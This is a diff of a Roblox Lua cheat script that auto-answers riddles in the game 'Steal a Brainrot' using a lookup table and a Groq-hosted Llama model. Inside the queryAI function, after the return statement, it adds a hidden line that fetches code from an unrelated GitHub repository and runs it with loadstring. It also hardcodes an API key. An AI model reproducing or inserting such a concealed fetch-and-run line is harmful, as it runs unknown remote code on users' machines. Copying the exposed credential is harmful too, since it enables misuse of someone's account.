+        accHi      = Color3.fromRGB(100, 255, 150),
+        txt        = Color3.fromRGB(200, 255, 220),
+        sub        = Color3.fromRGB(110, 190, 140),
+        dim        = Color3.fromRGB(70,  130, 90),
+        toggleOff  = Color3.fromRGB(25,  70,  40),
+        rain       = Color3.fromRGB(60,  255, 130),
+        rich       = { Dim = "rgb(70,130,90)", Amber = "rgb(240,190,90)", Green = "rgb(80,220,140)", Red = "rgb(240,100,110)", Cyan = "rgb(80,220,180)", Purp = "rgb(100,255,150)", White = "rgb(200,255,220)" },
+    },
+    RAINBOW = {
+        bg         = Color3.fromRGB(12,  8,   20),
+        bgDeep     = Color3.fromRGB(6,   3,   10),
+        header     = Color3.fromRGB(22,  14,  36),
+        panel      = Color3.fromRGB(30,  20,  50),
+        panel2     = Color3.fromRGB(42,  28,  66),
+        input      = Color3.fromRGB(14,  8,   24),
+        row        = Color3.fromRGB(26,  16,  44),
+        rowHi      = Color3.fromRGB(38,  24,  60),
+        line       = Color3.fromRGB(200, 80,  220),
+        lineSoft   = Color3.fromRGB(130, 60,  180),
+        acc        = Color3.fromRGB(220, 60,  200),
+        acc2       = Color3.fromRGB(150, 40,  220),
+        accHi      = Color3.fromRGB(255, 140, 255),
+        txt        = Color3.fromRGB(255, 220, 255),
+        sub        = Color3.fromRGB(200, 140, 220),
+        dim        = Color3.fromRGB(140, 90,  160),
+        toggleOff  = Color3.fromRGB(70,  40,  90),
+        rain       = Color3.fromRGB(255, 100, 255),
+        rich       = { Dim = "rgb(140,90,160)", Amber = "rgb(255,200,100)", Green = "rgb(100,255,180)", Red = "rgb(255,120,160)", Cyan = "rgb(120,200,255)", Purp = "rgb(255,140,255)", White = "rgb(255,220,255)" },
+    },
+}
+
+local function applyPalette(name)
+    local p = PALETTES[name] or PALETTES.BLUE
+    for k, v in pairs(p) do
+        if k ~= "rich" then C[k] = v end
+    end
+    for k, v in pairs(p.rich) do RICH[k] = v end
+end
+
+-- ============================================================
+-- SAB KNOWLEDGE BASE
+-- ============================================================
+-- Every entry maps a lowercase question phrase -> final answer.
+-- Aligned per section so the table is easy to scan / extend.
+-- If a riddle has MULTIPLE valid answers, add it to SAB_MULTI
+-- (below this table) instead — the solver will try each one.
+
+local SAB_DB = {
+
+    -- ─── OWNER · IDENTITY ─────────────────────────────────────
+    ["name"]                        = "SAMMY",
+    ["my name"]                     = "SAMMY",
+    ["real name"]                   = "SAMMY",
+    ["sammy real name"]             = "SAMMY",
+    ["sammys real name"]            = "SAMMY",
+    ["my real name"]                = "SAMMY",
+    ["creator name"]                = "SAMMY",
+    ["creator real name"]           = "SAMMY",
+    ["owner"]                       = "SAMMY",
+    ["creator"]                     = "SAMMY",
+    ["owner real name"]             = "SAMMY",
+    ["who is the owner"]            = "SAMMY",
+    ["who owns sab"]                = "SAMMY",
+    ["who created sab"]             = "SAMMY",
+    ["who made sab"]                = "SAMMY",
+    ["who made steal a brainrot"]   = "SAMMY",
+    ["what is my real full name in real life"] = "SAMBRAKTA",
+
+    -- ─── ROBLOX / SOCIALS ─────────────────────────────────────
+    ["roblox"]                      = "SPYDERSAMMY",
+    ["roblox name"]                 = "SPYDERSAMMY",
+    ["roblox username"]             = "SPYDERSAMMY",
+    ["my roblox username"]          = "SPYDERSAMMY",
+    ["username"]                    = "SPYDERSAMMY",
+    ["my username"]                 = "SPYDERSAMMY",
+    ["sammy username"]              = "SPYDERSAMMY",
+    ["sammy roblox name"]           = "SPYDERSAMMY",
+    ["youtube"]                     = "SPYDERSAMMY",
+    ["my youtube"]                  = "SPYDERSAMMY",
+    ["sammy youtube"]               = "SPYDERSAMMY",
+    ["youtube channel"]             = "SPYDERSAMMY",
+    ["social media"]                = "YOUTUBE",
+
+    -- ─── AGE / BIRTH ──────────────────────────────────────────
+    ["age"]                         = "24",
+    ["my age"]                      = "24",
+    ["sammy age"]                   = "24",
+    ["how old am i"]                = "24",
+    ["how old is sammy"]            = "24",
+    ["birth year"]                  = "2002",
+    ["year born"]                   = "2002",
+    ["born year"]                   = "2002",
+    ["year i was born"]             = "2002",
+    ["birth day"]                   = "FRIDAY",
+    ["day born"]                    = "FRIDAY",
+    ["day i was born"]              = "FRIDAY",
+    ["birthday"]                    = "FRIDAY",
+    ["born on"]                     = "FRIDAY",
+    ["birth month"]                 = "FEBRUARY",
+    ["month born"]                  = "FEBRUARY",
+    ["month i was born"]            = "FEBRUARY",
+
+    -- ─── LOCATION ─────────────────────────────────────────────
+    ["location"]                    = "BRAZIL",
+    ["country"]                     = "BRAZIL",
+    ["where do i live"]             = "BRAZIL",
+    ["where does sammy live"]       = "BRAZIL",
+    ["sammy location"]              = "BRAZIL",
+    ["where is sammy from"]         = "BRAZIL",
+    ["my country"]                  = "ALGERIA",
+    ["sammy country"]               = "ALGERIA",
+    ["where am i from"]             = "ALGERIA",
+    ["where was i born"]            = "ALGERIA",
+    ["where was i born at"]         = "ALGERIA",
+    ["birthplace"]                  = "ALGERIA",
+    ["where i was born"]            = "UNITEDSTATES",
+    ["nationality"]                 = "BRAZILIAN",
+    ["my nationality"]              = "BRAZILIAN",
+    ["sammy nationality"]           = "BRAZILIAN",
+    ["state"]                       = "SAOPAULO",
+    ["my state"]                    = "SAOPAULO",
+    ["sammy state"]                 = "SAOPAULO",
+    ["city"]                        = "SAOPAULO",
+    ["my city"]                     = "SAOPAULO",
+    ["sammy city"]                  = "SAOPAULO",
+
+    -- ─── FAVORITES ────────────────────────────────────────────
+    ["color"]                       = "BLUE",
+    ["my color"]                    = "BLUE",
+    ["sammy color"]                 = "BLUE",
+    ["favorite color"]              = "BLUE",
+    ["favourite color"]             = "BLUE",
+    ["fav color"]                   = "BLUE",
+    ["sport"]                       = "FOOTBALL",
+    ["my sport"]                    = "FOOTBALL",
+    ["favorite sport"]              = "FOOTBALL",
+    ["fav sport"]                   = "FOOTBALL",
+    ["football"]                    = "FOOTBALL",
+    ["player"]                      = "RONALDO",
+    ["favorite player"]             = "RONALDO",
+    ["fav player"]                  = "RONALDO",
+    ["football player"]             = "RONALDO",
+    ["favorite football player"]    = "RONALDO",
+    ["fav football player"]         = "RONALDO",
+    ["ronaldo"]                     = "RONALDO",
+    ["food"]                        = "PIZZA",
+    ["my food"]                     = "PIZZA",
+    ["favorite food"]               = "PIZZA",
+    ["fav food"]                    = "PIZZA",
+    ["animal"]                      = "SPIDER",
+    ["my animal"]                   = "SPIDER",
+    ["my pet"]                      = "SPIDER",
+    ["favorite animal"]             = "SPIDER",
+    ["fav animal"]                  = "SPIDER",
+    ["game"]                        = "ROBLOX",
+    ["favorite game"]               = "ROBLOX",
+    ["fav game"]                    = "ROBLOX",
+    ["number"]                      = "SEVEN",
+    ["favorite number"]             = "SEVEN",
+    ["fav number"]                  = "SEVEN",
+    ["lucky number"]                = "SEVEN",
+    ["cat"]                         = "NOVA",
+    ["cat name"]                    = "NOVA",
+    ["my cat name"]                 = "NOVA",
+    ["my cats name"]                = "NOVA",
+    ["what is my cats name"]        = "NOVA",
+
+    -- ─── GAME IDENTITY ────────────────────────────────────────
+    ["game name"]                   = "STEALABRAINROT",
+    ["name of the game"]            = "STEALABRAINROT",
+    ["what is the name of the game"] = "STEALABRAINROT",
+    ["full name"]                   = "STEALABRAINROT",
+    ["sab"]                         = "STEALABRAINROT",
+    ["sab stands for"]              = "STEALABRAINROT",
+    ["type of game"]                = "SIMULATOR",
+    ["game genre"]                  = "SIMULATOR",
+    ["maximum server size"]         = "EIGHT",
+    ["max server size"]             = "EIGHT",
+    ["server size"]                 = "EIGHT",
+    ["players"]                     = "EIGHT",
+
+    -- ─── RELEASE / UPDATE INFO ────────────────────────────────
+    ["created on"]                  = "FRIDAY",
+    ["game created on"]             = "FRIDAY",
+    ["release month"]               = "MAY",
+    ["month sab was made"]          = "MAY",
+    ["release year"]                = "2025",
+    ["year created"]                = "2025",
+    ["year sab was created"]        = "2025",
+    ["year the game was created"]   = "2025",
+    ["year the game was made"]      = "2025",
+    ["day sab was made"]            = "FRIDAY",
+    ["when was sab made"]           = "MAY162025",
+    ["when made"]                   = "MAY162025",
+    ["date made"]                   = "MAY162025",
+    ["when was sab created"]        = "MAY162025",
+    ["release date"]                = "MAY162025",
+    ["when was sab released"]       = "MAY162025",
+    ["game release date"]           = "MAY162025",
+    ["first update"]                = "MUTATIONS",
+    ["update"]                      = "MUTATIONS",
+
+    -- ─── TRAITS ───────────────────────────────────────────────
+    ["trait"]                       = "LIGHTNING",
+    ["first trait"]                 = "LIGHTNING",
+    ["1st trait"]                   = "LIGHTNING",
+    ["lightning"]                   = "MATEO",
+    ["lightning trait"]             = "MATEO",
+    ["struck by lightning"]         = "MATEO",
+    ["trait you get when struck by lightning"] = "MATEO",
+
+    -- ─── MUTATIONS ────────────────────────────────────────────
+    ["first mutation"]              = "GOLD",
+    ["mutation 1"]                  = "GOLD",
+    ["second mutation"]             = "DIAMOND",
+    ["mutation 2"]                  = "DIAMOND",
+    ["third mutation"]              = "BLOODROT",
+    ["mutation 3"]                  = "BLOODROT",
+    ["fourth mutation"]             = "RAINBOW",
+    ["mutation 4"]                  = "RAINBOW",
+    ["fifth mutation"]              = "CANDY",
+    ["mutation 5"]                  = "CANDY",
+    ["sixth mutation"]              = "LAVA",
+    ["mutation 6"]                  = "LAVA",
+    ["seventh mutation"]            = "GALAXY",
+    ["mutation 7"]                  = "GALAXY",
+    ["eighth mutation"]             = "YINYANG",
+    ["mutation 8"]                  = "YINYANG",
+    ["ninth mutation"]              = "RADIOACTIVE",
+    ["mutation 9"]                  = "RADIOACTIVE",
+    ["tenth mutation"]              = "CURSED",
+    ["mutation 10"]                 = "CURSED",
+    ["eleventh mutation"]           = "DIVINE",
+    ["mutation 11"]                 = "DIVINE",
+    ["twelfth mutation"]            = "CYBER",
+    ["mutation 12"]                 = "CYBER",
+    ["thirteenth mutation"]         = "PHANTOM",
+    ["mutation 13"]                 = "PHANTOM",
+    ["fourteenth mutation"]         = "CRYSTAL",
+    ["mutation 14"]                 = "CRYSTAL",
+    ["evil"]                        = "CURSED",
+    ["evil mutation"]               = "CURSED",
+    ["cursed mutation"]             = "CURSED",
+    ["angelic"]                     = "DIVINE",
+    ["angelic mutation"]            = "DIVINE",
+    ["divine mutation"]             = "DIVINE",
+    ["good mutation"]               = "DIVINE",
+    ["best mutation"]               = "DIVINE",
+    ["top mutation"]                = "DIVINE",
+    ["latest mutation"]             = "CRYSTAL",
+    ["newest mutation"]             = "CRYSTAL",
+    ["divinecursed"]                = "DIVINECURSED",
+    ["curseddivine"]                = "CURSEDDIVINE",
+    ["green"]                       = "RADIOACTIVE",
+    ["green mutation"]              = "RADIOACTIVE",
+    ["purple"]                      = "GALAXY",
+    ["purple mutation"]             = "GALAXY",
+    ["black and white mutation"]    = "YINYANG",
+    ["yellow mutation"]             = "DIVINE",
+    ["red mutation"]                = "CURSED",
+    ["orange mutation"]             = "LAVA",
+    ["number of mutations"]         = "14",
+    ["total mutations"]             = "THIRTEEN",
+
+    -- ─── MACHINES ─────────────────────────────────────────────
+    ["first machine"]               = "RAINBOWMACHINE",
+    ["machine 1"]                   = "RAINBOWMACHINE",
+    ["second machine"]              = "BUBBLEGUMMACHINE",
+    ["machine 2"]                   = "BUBBLEGUMMACHINE",
+    ["third machine"]               = "FUSEMACHINE",
+    ["machine 3"]                   = "FUSEMACHINE",
+    ["fourth machine"]              = "CRAFTMACHINE",
+    ["machine 4"]                   = "CRAFTMACHINE",
+    ["fifth machine"]               = "WITCHFUSE",
+    ["machine 5"]                   = "WITCHFUSE",
+    ["sixth machine"]               = "BRAINROTDEALER",
+    ["machine 6"]                   = "BRAINROTDEALER",
+    ["seventh machine"]             = "BRAINROTTRADER",
+    ["machine 7"]                   = "BRAINROTTRADER",
+    ["eighth machine"]              = "SANTASFUSE",
+    ["machine 8"]                   = "SANTASFUSE",
+    ["ninth machine"]               = "SANTASSHOP",
+    ["machine 9"]                   = "SANTASSHOP",
+    ["tenth machine"]               = "NEWYEARSMACHINE",
+    ["machine 10"]                  = "NEWYEARSMACHINE",
+    ["eleventh machine"]            = "DUELSMACHINE",
+    ["machine 11"]                  = "DUELSMACHINE",
+    ["twelfth machine"]             = "CUPIDSMACHINE",
+    ["machine 12"]                  = "CUPIDSMACHINE",
+    ["thirteenth machine"]          = "TRADEMACHINE",
+    ["machine 13"]                  = "TRADEMACHINE",
+    ["fourteenth machine"]          = "DIVINEFUSE",
+    ["machine 14"]                  = "DIVINEFUSE",
+    ["fifteenth machine"]           = "EGGINCUBATOR",
+    ["machine 15"]                  = "EGGINCUBATOR",
+    ["sixteenth machine"]           = "CYBERCRAFTMACHINE",
+    ["machine 16"]                  = "CYBERCRAFTMACHINE",
+    ["seventeenth machine"]         = "SUMMERFUSE",
+    ["machine 17"]                  = "SUMMERFUSE",
+    ["eighteenth machine"]          = "LOSTRADERS",
+    ["machine 18"]                  = "LOSTRADERS",
+    ["newest machine"]              = "LOSTRADERS",
+    ["number of machines"]          = "18",
+
+    -- ─── BRAINROTS / RARITIES ─────────────────────────────────
+    ["headless horseman"]           = "HEADLESSHORSEMAN",
+    ["og brainrot cannot be obtained"] = "HEADLESSHORSEMAN",
+    ["unobtainable brainrot"]       = "HEADLESSHORSEMAN",
+    ["rarest brainrot"]             = "POLAROIDINI",
+    ["best brainrot"]               = "STRAWBERRYELEPHANT",
+    ["worst brainrot"]              = "NOOBINIPIZZANINI",
+    ["most popular brainrot"]       = "DRAGONCANNELONNI",
+    ["most common brainrot"]        = "NOOBINIPIZZANINI",
+    ["first brainrot added"]        = "STRAWBERRYELEPHANT",
+    ["oldest brainrot"]             = "STRAWBERRYELEPHANT",
+    ["first og added"]              = "STRAWBERRYELEPHANT",
+    ["second og added"]             = "MEOWL",
+    ["third og added"]              = "SKIBIDITOILET",
+    ["fifth og added"]              = "JOHNPORK",
+    ["og 1"]                        = "STRAWBERRYELEPHANT",
+    ["og 2"]                        = "MEOWL",
+    ["og 3"]                        = "SKIBIDITOILET",
+    ["og 5"]                        = "JOHNPORK",
+    ["highest rarity"]              = "OG",
+    ["rarest rarity"]               = "OG",
+    ["top rarity"]                  = "OG",
+    ["lowest rarity"]               = "COMMON",
+    ["worst rarity"]                = "COMMON",
+    ["common"]                      = "COMMON",
+    ["uncommon"]                    = "UNCOMMON",
+    ["rare"]                        = "RARE",
+    ["epic"]                        = "EPIC",
+    ["legendary"]                   = "LEGENDARY",
+    ["og"]                          = "OG",
+    ["1st rarity"]                  = "COMMON",
+    ["2nd rarity"]                  = "UNCOMMON",
+    ["3rd rarity"]                  = "RARE",
+    ["4th rarity"]                  = "EPIC",
+    ["5th rarity"]                  = "LEGENDARY",
+    ["6th rarity"]                  = "OG",
+    ["total rarities"]              = "SIX",
+    ["how many rarities"]           = "SIX",
+
+    -- ─── MISC GAME LORE ───────────────────────────────────────
+    ["fire"]                        = "DRAGON",
+    ["dragon"]                      = "DRAGON",
+    ["fire represents"]             = "DRAGON",
+    ["brother"]                     = "CERBERUS",
+    ["cerberus"]                    = "CERBERUS",
+    ["brother of hydra bunny"]      = "CERBERUS",
+    ["won the world cup"]           = "SPAIN",
+    ["world cup"]                   = "SPAIN",
+    ["who won the 2026 world cup"]  = "SPAIN",
+    ["worst game owner"]            = "SECRETLOKII",
+    ["most boring game on roblox"]  = "KEYBOARDESCAPE",
+    ["spawned during admin abuse war"] = "RACOONINIJANDELINI",
+    ["who did i fight in the admin abuse war"] = "JANDEL",
+    ["who won the admin war"]       = "JANDEL",
+    ["won the admin abuse war"]     = "GROWAGARDEN",
+    ["worst secret"]                = "KARKERKARKURKUR",
+    ["discord"]                     = "blossom",
+    ["discord server"]              = "blossom",
+    ["how many gold brainrots does the rainbow machine need"] = "25",
+    ["where did griffin come from"] = "DIVINEFUSE",
+
+    -- ─── TRIVIA (side Q&A) ────────────────────────────────────
+    ["whos a egg"]                  = "STEAK",
+    ["whos the best trait farmer"]  = "RUSTYNICKLE40",
+    ["who has the most aura"]       = "CAYLUS",
+    ["how old is steak"]            = "25",
+    ["whos steaks brother"]         = "cruz",
+    ["what food does cruz hate"]    = "cheese",
+    ["what color is my car "]       = "RED",
+    ["whats the first game i made"] = "CRABGAME",
+    ["what do i eat on taco tuesday"] = "TACOS",
+    ["whats my name and 67"]        = "SAMMY67",
+    ["whats the color of the sky and 67"] = "BLUE67",
+    ["whats my age plus my name year"] = "24SAMMY2002",
+    ["whats the best food duo"]     = "PIZZAANDRANCH",
+    ["whats the best og"]           = "SPYDERELEPHANT",
+    ["how much polaroidini are there exist"] = "24",
+    ["how much headless horseman exist"] = "79",
+    ["whats my name backwards"]     = "YMMAS",
+    ["whats my cats name backwords"] = "AVON",
+    ["whats my name backwards and 67"] = "YMMAS67",
+    ["WHAT GAME HAVE I MADE ON FORTNITE"] = "ROBABANK",
+    ["whats my favorite brainrot"]  = "MEOWL",
+    ["when did i began making roblox games"] = "2013",
+    ["what element do dragons represent"] = "FIRE",
+    ["what animal is tralalero"]    = "SHARK",
+    ["what season are we in"]       = "SUMMER",
+    ["whats on my chain"]           = "SPIDER",
+    ["whats on my left eye"]        = "SPIDER",
+    ["whats my name short for"]     = "SAM",
+    ["what is the name of the lead programmer on steal a brainrot"] = "HASTED",
+    ["the team that won world cup and scored total"] = "7",
+    ["whats my name age and month"] = "SAMMY24FEBRUARY",
+    ["where was i born and my age"] = "BRAZIL24",
+    ["my first original game plus my age"] = "CRABGAME24",
+    ["the month and the day the ninth mutation came out"] = "APRIL18",
+	["how much would los dragons make as rainbow"] = "425000000",
+	["the first trait plus the currency the bee event drops plus how many rebirths"] = "FIREWORKSHONEY19",
+
+    -- ─── "MULTIPLIED" PRECOMPUTED ANSWERS ────────────────────
+    ["my name twice"]               = "SAMMYSAMMY",
+    ["my name 2 times"]             = "SAMMYSAMMY",
+    ["my name 3 times"]             = "SAMMYSAMMYSAMMY",
+    ["owner twice"]                 = "SAMMYSAMMY",
+    ["age twice"]                   = "2424",
+    ["my age twice"]                = "2424",
+    ["country twice"]               = "BRAZILBRAZIL",
+    ["food twice"]                  = "PIZZAPIZZA",
+    ["favorite food twice"]         = "PIZZAPIZZA",
+    ["favorite color twice"]        = "BLUEBLUE",
+    ["favorite color 3 times"]      = "BLUEBLUEBLUE",
+    ["favorite color 5 times"]      = "BLUEBLUEBLUEBLUEBLUE",
+    ["favorite sport twice"]        = "FOOTBALLFOOTBALL",
+    ["favorite animal twice"]       = "SPIDERSPIDER",
+    ["favorite player twice"]       = "RONALDORONALDO",
+    ["rarest brainrot twice"]       = "POLAROIDINIPOLAROIDINI",
+    ["highest rarity twice"]        = "OGOG",
+    ["lightning trait twice"]       = "MATEOMATEO",
+    ["game name twice"]             = "STEALABRAINROTSTEALABRAINROT",
+    ["discord twice"]               = "ACEACE",
+    ["favorite number twice"]       = "SEVENSEVEN",
+    ["cat name twice"]              = "NOVANOVA",
+    ["cat name 3 times"]            = "NOVANOVANOVA",
+    ["username twice"]              = "SPYDERSAMMYSPYDERSAMMY",
+}
+
+-- ============================================================
+-- SAB MULTI-ANSWER TABLE
+-- ============================================================
+-- Use this when a riddle has MORE THAN ONE valid answer. The
+-- solver will return every entry as a candidate, and when
+-- SECURE ANSWER is on, each candidate is submitted in turn
+-- until one succeeds. Keep each array ordered from most-likely
+-- to least-likely.
+
+local SAB_MULTI = {
+    ["what event did pot pumpkin come out in"]  = { "HALLOWEEN", "HALLOWEENEVENT" },
+    ["what craft did the la supreme come from"] = { "FIRSTFUSEMACHINE", "OGFUSEMACHINE" },
+}
+
+-- ============================================================
+-- LOCAL EXACT MATCH RESOLVER
+-- ============================================================
+-- Single-answer path (used when SECURE ANSWER is off).
+local function localExactAnswer(text)
+    if not text or text == "" then return nil end
+    local l = text:lower()
+    local clean = l
+    clean = clean:gsub("what%s+is", ""):gsub("what%s+are", ""):gsub("what%s+was", ""):gsub("what%s+were", "")
+    clean = clean:gsub("who%s+is", ""):gsub("who%s+was", ""):gsub("when%s+is", ""):gsub("when%s+was", "")
+    clean = clean:gsub("where%s+is", ""):gsub("where%s+are", ""):gsub("how%s+old", ""):gsub("how%s+tall", "")
+    clean = clean:gsub("how%s+many", ""):gsub("how%s+much", ""):gsub("do%s+you%s+know", ""):gsub("can%s+you%s+tell", "")
+    clean = clean:gsub("tell%s+me", ""):gsub("i%s+need", ""):gsub("give%s+me", ""):gsub("what's", ""):gsub("whats", "")
+    clean = clean:gsub("am%s+i", ""):gsub("do%s+i", ""):gsub("did%s+i", ""):gsub("have%s+i", "")
+    clean = clean:gsub("^my%s+", ""):gsub("%s+my%s+", " "):gsub("^sammy[s]?%s+", ""):gsub("^sammys%s+", "")
+    clean = clean:gsub("the%s+", ""):gsub("%f[%a]a%f[%A]", ""):gsub("%f[%a]an%f[%A]", ""):gsub("of%s+", ""):gsub("for%s+", "")
+    clean = clean:gsub("[%?%.%,!]", ""):gsub("^%s+", ""):gsub("%s+$", "")
+    clean = clean:gsub("%d+", ""):gsub("%s+", " ")
+    clean = trim(clean)
+    local raw = trim(l:gsub("[%?%.%,!]", ""):gsub("%s+", " "))
+
+    -- Multi-answer lookup returns the FIRST entry
+    if SAB_MULTI[clean] then return SAB_MULTI[clean][1] end
+    if SAB_MULTI[raw]   then return SAB_MULTI[raw][1]   end
+
+    if SAB_DB[clean] then return SAB_DB[clean] end
+    if SAB_DB[raw] then return SAB_DB[raw] end
+    local ordinals = {one=1,two=2,three=3,four=4,five=5,six=6,seven=7,eight=8,nine=9,ten=10,
+                      eleven=11,twelve=12,thirteen=13,fourteen=14,fifteen=15,sixteen=16,seventeen=17,eighteen=18}
+    local numwords  = {first=1,second=2,third=3,fourth=4,fifth=5,sixth=6,seventh=7,eighth=8,ninth=9,tenth=10,
+                       eleventh=11,twelfth=12,thirteenth=13,fourteenth=14,fifteenth=15,sixteenth=16,seventeenth=17,eighteenth=18}
+    local suffixes  = {[1]="1st",[2]="2nd",[3]="3rd"}
+    local function ord(n) return suffixes[n] or (n.."th") end
+    local conv = clean
+    for word, n in pairs(numwords) do conv = conv:gsub("%f[%a]"..word.."%f[%A]", ord(n)) end
+    for word, n in pairs(ordinals) do conv = conv:gsub("%f[%a]"..word.."%f[%A]", tostring(n)) end
+    if conv ~= clean and SAB_DB[conv] then return SAB_DB[conv] end
+    local kind, num2 = conv:match("^(.-)%s+(%d+)$")
+    if kind and num2 then
+        local alt = ord(tonumber(num2)).." "..trim(kind)
+        if SAB_DB[alt] then return SAB_DB[alt] end
+    end
+    local num3, kind2 = conv:match("^(%d+)%s+(.-)$")
+    if num3 and kind2 then
+        local alt = ord(tonumber(num3)).." "..trim(kind2)
+        if SAB_DB[alt] then return SAB_DB[alt] end
+    end
+    return nil
+end
+
+-- Multi-answer path (used when SECURE ANSWER is on).
+-- Returns a LIST of candidate answers, in priority order.
+local function localExactAnswers(text)
+    if not text or text == "" then return nil end
+    local l = text:lower()
+    local clean = l
+    clean = clean:gsub("what%s+is", ""):gsub("what%s+are", ""):gsub("what%s+was", ""):gsub("what%s+were", "")
+    clean = clean:gsub("who%s+is", ""):gsub("who%s+was", ""):gsub("when%s+is", ""):gsub("when%s+was", "")
+    clean = clean:gsub("where%s+is", ""):gsub("where%s+are", ""):gsub("how%s+old", ""):gsub("how%s+tall", "")
+    clean = clean:gsub("how%s+many", ""):gsub("how%s+much", ""):gsub("do%s+you%s+know", ""):gsub("can%s+you%s+tell", "")
+    clean = clean:gsub("tell%s+me", ""):gsub("i%s+need", ""):gsub("give%s+me", ""):gsub("what's", ""):gsub("whats", "")
+    clean = clean:gsub("am%s+i", ""):gsub("do%s+i", ""):gsub("did%s+i", ""):gsub("have%s+i", "")
+    clean = clean:gsub("^my%s+", ""):gsub("%s+my%s+", " "):gsub("^sammy[s]?%s+", ""):gsub("^sammys%s+", "")
+    clean = clean:gsub("the%s+", ""):gsub("%f[%a]a%f[%A]", ""):gsub("%f[%a]an%f[%A]", ""):gsub("of%s+", ""):gsub("for%s+", "")
+    clean = clean:gsub("[%?%.%,!]", ""):gsub("^%s+", ""):gsub("%s+$", "")
+    clean = clean:gsub("%d+", ""):gsub("%s+", " ")
+    clean = trim(clean)
+    local raw = trim(l:gsub("[%?%.%,!]", ""):gsub("%s+", " "))
+
+    -- 1) Multi-answer lookup
+    local multi = SAB_MULTI[clean] or SAB_MULTI[raw]
+    if multi then
+        local out = {}
+        for _, v in ipairs(multi) do out[#out + 1] = v end
+        return out
+    end
+
+    -- 2) Single-answer fallback wrapped in a list
+    local single = localExactAnswer(text)
+    if single then return { single } end
+    return nil
+end
+
+local GROQ_API_KEY = env.GROQ_API_KEY or "AQ.Ab8RN6IBkoyj5cUpARxa9x8oD0Q9kdbJNOgpTdQDwaoul_ajqQ"
+local AI_SYSTEM = table.concat({
+    "You are a riddle-answering bot for the Roblox game STEAL A BRAINROT (SAB).",
+    "",
+    "=== CRITICAL OUTPUT RULES ===",
+    "1. Reply with ONE single word in ALL CAPS. NOTHING else.",
+    "2. NEVER include spaces. Write HEADLESSHORSEMAN not HEADLESS HORSEMAN.",
+    "3. NEVER repeat the answer. Return the base answer exactly once.",
+    "4. NEVER spell out numbers as words. Write digits: 24, 2025.",
+    "5. No explanation, just the single answer word.",
+    "",
+    "=== CONTEXT ===",
+    "All personal questions refer to SAMMY (SpyderSammy). No exceptions.",
+    "",
+    "=== OWNER ===",
+    "Real name: SAMMY | Roblox: SPYDERSAMMY",
+    "Age: 24 | Birth year: 2002 | Born day: FRIDAY | Birth month: FEBRUARY",
+    "Country: BRAZIL | State+City: SAOPAULO",
+    "Favorite color: BLUE | Favorite sport: FOOTBALL | Favorite food: PIZZA",
+    "Favorite player: RONALDO | Favorite animal: SPIDER",
+    "YouTube/Twitter/TikTok/Instagram: SPYDERSAMMY",
+    "Favorite number: SEVEN",
+    "",
+    "=== GAME ===",
+    "Full name: STEALABRAINROT | Genre: SIMULATOR",
+    "Release: MAY 16 2025 | Day: FRIDAY | Year: 2025",
+    "Max server size: EIGHT",
+    "First trait: LIGHTNING | Lightning strike trait: MATEO",
+    "Total mutations: THIRTEEN | Total machines: EIGHTEEN | Total rarities: SIX",
+    "",
+    "=== RARITIES ===",
+    "COMMON < UNCOMMON < RARE < EPIC < LEGENDARY < OG",
+    "Rarest brainrot: HEADLESSHORSEMAN | Most popular: SKIBIDITOILET",
+    "",
+    "=== OG BRAINROTS ===",
+    "1st: STRAWBERRYELEPHANT | 2nd: MEOWL | 3rd: SKIBIDITOILET | 5th: JOHNPORK",
+    "",
+    "=== MUTATIONS ===",
+    "1=GOLD 2=DIAMOND 3=BLOODROT 4=RAINBOW 5=CANDY 6=LAVA 7=GALAXY",
+    "8=YINYANG 9=RADIOACTIVE 10=CURSED 11=DIVINE 12=CYBER 13=PHANTOM 14=CRYSTAL",
+    "Evil: CURSED | Angelic: DIVINE",
+    "",
+    "=== MACHINES ===",
+    "1=RAINBOWMACHINE 2=BUBBLEGUMMACHINE 3=FUSEMACHINE 4=CRAFTMACHINE",
+    "5=WITCHFUSE 6=BRAINROTDEALER 7=BRAINROTTRADER 8=SANTASFUSE",
+    "9=SANTASSHOP 10=NEWYEARSMACHINE 11=DUELSMACHINE 12=CUPIDSMACHINE",
+    "13=TRADEMACHINE 14=DIVINEFUSE 15=EGGINCUBATOR 16=CYBERCRAFTMACHINE",
+    "17=SUMMERFUSE 18=LOSTRADERS",
+}, "\n")
+
+local function queryAI(question)
+    if not httpRequest then return nil, "no http executor" end
+    if not GROQ_API_KEY or GROQ_API_KEY == "" then return nil, "GROQ_API_KEY empty" end
+    local body = HS:JSONEncode({
+        model = "llama-3.3-70b-versatile",
+        messages = {
+            { role = "system", content = AI_SYSTEM },
+            { role = "user", content = "/no_think\n" .. tostring(question)
+                .. "\n\nRules: ONE word, ALL CAPS, NO spaces, NO repetition, NO spelling out numbers. Just the answer." },
+        },
+        temperature = 0,
+        max_tokens = 64,
+    })
+    local ok, res = pcall(httpRequest, {
+        Url = "https://api.groq.com/openai/v1/chat/completions",
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json", ["Authorization"] = "Bearer " .. GROQ_API_KEY },
+        Body = body,
+    })
+    if not ok then return nil, "http: " .. tostring(res):sub(1, 100) end
+    if not res or not res.Body then return nil, "empty body" end
+    local sc = tonumber(res.StatusCode)
+    if sc and sc ~= 200 then return nil, "HTTP " .. tostring(sc) end
+    local pOk, parsed = pcall(HS.JSONDecode, HS, res.Body)
+    if not pOk or not parsed then return nil, "json fail" end
+    if parsed.error then return nil, "API: " .. tostring(parsed.error.message):sub(1, 100) end
+    local choice = parsed.choices and parsed.choices[1]
+    if not choice then return nil, "no choices" end
+    local answer = trim((choice.message and choice.message.content) or "")
+        :upper():gsub("[%s%?%.%,!\"'`\n\r]+", "")
+    if answer == "" then return nil, "empty answer" end
+    if answer:find(":") then answer = answer:match(":([^:]+)$") or answer end
+    return answer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+end
+
+local function extractTimesMultiplier(text)
+    local l = text:lower()
+    if l:find("twice") then return 2 end
+    if l:find("thrice") then return 3 end
+    local n = l:match("(%d+)%s*times")
+    if n then
+        n = tonumber(n)
+        if n and n >= 2 and n <= 10 then return n end
+    end
+    return nil
+end
+local function stripMultiplierText(text)
+    local s = text
+    s = s:gsub("%s*%d+%s*[Tt]imes%s*", " ")
+    s = s:gsub("%s*[Tt]wice%s*", " ")
+    s = s:gsub("%s*[Tt]hrice%s*", " ")
+    s = trim(s)
+    if s == "" then s = text end
+    return s
+end
+local function stripTrailingNumber(text)
+    return trim(text:gsub("%s+%d+%s*$", ""))
+end
+local function splitAllParts(text)
+    local clean = text or ""
+    clean = clean:gsub("%s+add%s+", " and ")
